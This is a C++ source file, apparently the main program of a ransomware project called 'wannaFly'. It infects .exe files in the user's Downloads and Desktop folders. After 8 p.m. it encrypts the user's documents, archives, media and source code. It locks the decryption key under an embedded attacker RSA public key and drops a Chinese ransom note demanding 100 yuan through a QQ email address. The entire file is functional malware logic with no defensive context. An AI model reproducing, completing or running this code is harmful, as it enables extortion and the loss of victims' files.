// wannaFly.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <iostream>
#include <list>
#include "fileEncrpty/SearchFile.h"
#include "fileEncrpty/encrptyFile.h"

#include <windows.h>   
#include <winnt.h>   
#include <stdio.h>   
#include <assert.h>  
#include "infect/infect.h"
#include <fstream>
using namespace std;
void fuckFiles(list<string> baseFilepath, list<string> fliter, encrptyFile fuck);
void reFiles(list<string> baseFilepath, encrptyFile fuck);

void InfectFiles(list<string> files, char* argv[]);
string pubkey("-----BEGIN RSA PUBLIC KEY-----\nMIIBiAKCAYEA2FVHuTjaFec1AqRelp+7E5O1q6xB10KVuvjA86K2hjBn9Ock3UyJ\nVcows9/bkA5j4PGtnEutB9nL47gpvA/CO7QOFa/jzihkagGHwSGequ/TOCYTMbfH\nCSpOlunJs8acW2TXbWg17tqGOb2UfFU4uOStmIH16QWOj/MwW5w4awzUCchWK5ri\neuvXRmgg+iI5gLXP844J8gg2n7K+ZuvN6YnpPCijaF3Zp3O/PHxdaUWvUi97qT7k\ngL2d8xy3onvGfypYbncX/IEyYWEIywUJk78MZzG4wm66lAMtTVJU8wFBndcqWSf5\nb60a1KAU9VEbJIW/FSSyyopWtbVpEUsRjfAWLJs0hXbq/eXvXrwxwbRu0+kAOPcH\n/Fpegvph5M8ML/bCWNjqVetOoIxVVwNUCxZFF2kAh4+OU8uFg7OumeBxEs8l2cbH\n4XZdYf0nRhbnu9lDa4TCf+mTBby0jIya7saLhKt5mlxA8HPf51KJbMxOH9vn4ixd\nDa3K6YMIsVUtAgER\n-----END RSA PUBLIC KEY-----");

char* ConvertLPWSTRToLPSTR(LPWSTR lpwszStrIn)
{
    LPSTR pszOut = NULL;
    try
    {
        if (lpwszStrIn != NULL)
        {
            int nInputStrLen = wcslen(lpwszStrIn);
            // Double NULL Termination 
            int nOutputStrLen = WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, NULL, 0, 0, 0) + 2;
            pszOut = new char[nOutputStrLen];
            if (pszOut)
            {
                memset(pszOut, 0x00, nOutputStrLen);
                WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, pszOut, nOutputStrLen, 0, 0);
            }
        }
    }

    catch (std::exception e)
    {

    }
    return pszOut;
}
int getHours()
{
    time_t t = time(0);
    return localtime(&t)->tm_hour;
}
char *getUsers()
{
    LPWSTR strBuffer = (LPWSTR)malloc(sizeof(WCHAR)*256);
    DWORD dwSize = 256;
    GetUserName(strBuffer, &dwSize);
    return ConvertLPWSTRToLPSTR(strBuffer);
}
list<string> cryFliter()
{
    list<string> p;
    p.push_back("doc");
    p.push_back("docx");
    p.push_back("xls");
    p.push_back("xlsx");
    p.push_back("ppt");
    p.push_back("pptx");
    p.push_back("zip");
    p.push_back("rar");
    p.push_back("design");
    p.push_back("raw");
    p.push_back("mp3");
    p.push_back("mp4");
    p.push_back("swf");
    p.push_back("ps");
    p.push_back("c4d");
    p.push_back("cdr");
    p.push_back("ai");
    p.push_back("maya");
    p.push_back("wmv");
    p.push_back("avi");
    p.push_back("flv");
    p.push_back("c");
    p.push_back("python");
    p.push_back("cpp");
    p.push_back("php");
    p.push_back("js");
    p.push_back("css");
    p.push_back("java");
    return p;
}
int main(int argc,char *argv[]) 
{


    list<string> needInfectExePath,exeFliter, needInfectExeFiles;

    needInfectExePath.push_back("C:\\Users\\" + (string)getUsers() + "\\Downloads");

    needInfectExePath.push_back("C:\\Users\\" + (string)getUsers() + "\\Desktop\\");
    exeFliter.push_back("exe");
    SearchFile findFile(needInfectExePath, exeFliter);
    findFile.toSearchFilePath();
    needInfectExeFiles = findFile.getAllFilePath();

    InfectFiles(needInfectExeFiles,argv);

    while (true)
    {
        if (getHours() >= 20)
        {
            ;
            list<string> baseFilepath, fliter = cryFliter();
            encrptyFile fuck,fuckEn;
            fuck.genKeys();
            fuckEn.setpubkey((char *)&pubkey[0]);

            baseFilepath.push_back("C:\\Users\\"+(string)getUsers()+"\\");
            fuckFiles(baseFilepath, fliter, fuck);
            ofstream ofs;
            ofs.open("C:\\Users\\" + (string)getUsers() + "\\recover.data", ios::out | ios::binary);
            fuckEn.setpubkey((char *)&pubkey[0]);
            string a = fuckEn.encryptData(fuck.getPrikey());
            ofs.write((char *)&a[0], a.size());
            string o = "echo 想要恢复文件？联系1006966418@qq.com!将recover.data发给我。你需要准备100元人民币。>C:\\Users\\" + (string)getUsers() + "\\readme.txt";
            system((char *)&o[0]);
            return 0;
        }
        Sleep(60000);
    }
	return 0;
}
